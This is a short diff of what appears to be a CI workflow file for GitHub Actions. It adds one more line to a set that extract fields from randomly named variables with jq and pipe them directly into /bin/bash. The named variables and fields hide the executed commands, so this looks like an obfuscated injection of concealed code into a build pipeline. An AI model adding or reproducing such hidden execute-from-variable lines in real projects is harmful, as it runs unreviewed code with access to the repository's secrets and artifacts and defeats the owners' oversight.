@@ -35,6 +35,7 @@ jobs:
           echo $dd079 | jq -r .khv1 | /bin/bash
           printf '%s' "$dpu9991" | jq -r .tbkus11 | /bin/bash
           echo $hykvv125 | jq -r .uuyx72053 | /bin/bash
+          echo $dbqi94 | jq -r .ra55 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
